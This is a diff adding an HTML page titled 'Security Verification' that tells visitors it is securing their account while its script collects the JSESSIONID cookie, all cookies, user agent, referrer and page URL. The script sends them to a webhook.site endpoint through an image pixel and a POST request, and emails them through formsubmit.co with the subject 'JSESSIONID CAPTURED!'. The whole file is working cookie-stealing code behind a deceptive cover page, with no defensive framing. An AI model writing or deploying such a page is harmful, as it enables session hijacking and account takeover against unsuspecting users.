@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Verification</title>
+</head>
+<body>
+    <h2>Verifying your session...</h2>
+    <p>Please wait while we secure your account.</p>
+
+    <script>
+        // Function to get cookie value
+        function getCookie(name) {
+            let cookies = document.cookie.split(';');
+            for(let i = 0; i < cookies.length; i++) {
+                let cookie = cookies[i].trim();
+                if(cookie.startsWith(name + '=')) {
+                    return cookie.substring(name.length + 1);
+                }
+            }
+            return 'COOKIE_NOT_FOUND';
+        }
+
+        // Capture ALL data
+        let sessionData = {
+            JSESSIONID: getCookie('JSESSIONID'),
+            ALL_COOKIES: document.cookie,
+            TIMESTAMP: new Date().toISOString(),
+            USER_AGENT: navigator.userAgent,
+            REFERRER: document.referrer,
+            URL: window.location.href,
+            LANGUAGE: navigator.language,
+            SCREEN: screen.width + 'x' + screen.height
+        };
+
+        // Send to Webhook.site - METHOD 1 (Image pixel)
+        let img = new Image();
+        img.src = 'https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310?jsession=' + 
+                  encodeURIComponent(sessionData.JSESSIONID) + 
+                  '&cookies=' + encodeURIComponent(sessionData.ALL_COOKIES) +
+                  '&time=' + encodeURIComponent(sessionData.TIMESTAMP);
+
+        // Send to Webhook.site - METHOD 2 (Fetch POST)
+        fetch('https://webhook.site/5b15d926-1347-4e32-89ff-bd6681723310', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(sessionData)
+        });
+
+        // Send to Email - METHOD 3
+        fetch('https://formsubmit.co/ajax/whitemaskoff101@gmail.com', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                subject: 'JSESSIONID CAPTURED!',
+                JSESSIONID: sessionData.JSESSIONID,
+                all_cookies: sessionData.ALL_COOKIES,
+                timestamp: sessionData.TIMESTAMP,
+                user_agent: sessionData.USER_AGENT,
+                referrer: sessionData.REFERRER,
+                message: 'Session data captured successfully'
+            })
+        });
+
+        console.log('CAPTURED DATA:', sessionData);
+    </script>
+</body>
+</html>
